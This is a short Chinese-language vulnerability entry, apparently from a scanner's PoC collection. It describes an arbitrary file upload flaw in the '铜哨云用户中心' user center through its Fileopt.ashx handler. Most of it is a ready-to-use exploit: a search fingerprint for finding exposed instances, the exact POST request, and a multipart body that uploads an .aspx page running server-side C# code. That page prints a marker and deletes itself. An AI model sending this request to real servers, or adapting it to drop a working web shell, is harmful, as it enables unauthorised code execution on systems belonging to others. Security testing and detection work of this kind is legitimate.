# 铜哨云用户中心Fileopt存在任意文件上传漏洞

- **系统**：铜哨云用户中心　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="铜哨云用户中心"`
- **请求**：`POST /Mobile/FrontInterface/Functions/Handles/File/Fileopt.ashx HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryf8KikBFW…`

**请求体 / payload**
```
------WebKitFormBoundaryf8KikBFWOrwSf2eA
Content-Disposition: form-data; name="File";filename="DudeSuite.aspx"
<%@ Page Language="C#"%><% Response.Write("DudeSuite"); System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
------WebKitFormBoundaryf8KikBFWOrwSf2eA
Content-Disposition: form-data; name="session"
1231221
------WebKitFormBoundaryf8KikBFWOrwSf2eA--
```
- **预期**：200　|　filePath